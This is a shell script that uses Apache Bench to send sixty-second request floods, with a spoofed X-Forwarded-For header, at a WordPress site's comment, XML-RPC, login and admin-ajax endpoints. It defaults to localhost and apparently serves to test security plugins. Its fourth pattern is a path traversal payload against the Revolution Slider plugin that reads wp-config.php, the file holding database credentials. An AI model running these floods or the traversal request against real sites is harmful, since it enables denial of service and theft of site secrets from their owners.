#! /bin/sh
# http://httpd.apache.org/docs/current/programs/ab.html
# Note: Set an appropriate TARGET and IP address as an attacker.

TARGET="http://localhost:8888/wordpress/"
HEADER="X-Forwarded-For: 129.223.152.47"
COOKIE="wordpress_test_cookie=WP+Cookie+check"

while [ $# -ge 1 ]; do
    case $1 in
        -a)  # IP address of an attacker
            shift; HEADER="X-Forwarded-For: $1"
            ;;
        -a*) # IP address of an attacker
            HEADER="X-Forwarded-For: `echo $1 | cut -c3-`"
            ;;
        -t)  # Target ULR
            shift; TARGET=$1
            ;;
        -t*) # Target ULR
            TARGET=`echo $1 | cut -c3-`
            ;;
        *) # attack pattern
            ATTACK=$*; break
            ;;
    esac
    shift
done

case ${ATTACK} in
    1) # wp-comments-post.php
        echo "=== attack on wp-comments-post.php ===\n"
        ab -t 60 -c 5 -H "${HEADER}" -C "${COOKIE}" -T "application/x-www-form-urlencoded" -p "wp-comments-post.txt" ${TARGET}wp-comments-post.php
        ;;
    2) # xmlrpc.php
        echo "=== attack on xmlrpc.php ===\n"
        ab -t 60 -c 5 -H "${HEADER}" -C "${COOKIE}" -T "text/html" -p "xmlrpc.txt" ${TARGET}xmlrpc.php
        ;;
    3) # wp-login.php
        echo "=== attack on wp-login.php ===\n"
        ab -t 60 -c 5 -H "${HEADER}" -C "${COOKIE}" -T "application/x-www-form-urlencoded" -p "wp-login.txt" ${TARGET}wp-login.php
        ;;
    4) # wp-admin/admin-ajax.php
        echo "=== attack on wp-admin/admin-ajax.php ===\n"
        ab -t 60 -c 5 -H "${HEADER}" -C "${COOKIE}" -T "text/plain" "${TARGET}wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
        ;;
    *) # help
        echo "usage: $0 [-a \"attacker IP address\"] [-t \"target home URL\"] [1-4]"
        ;;
esac
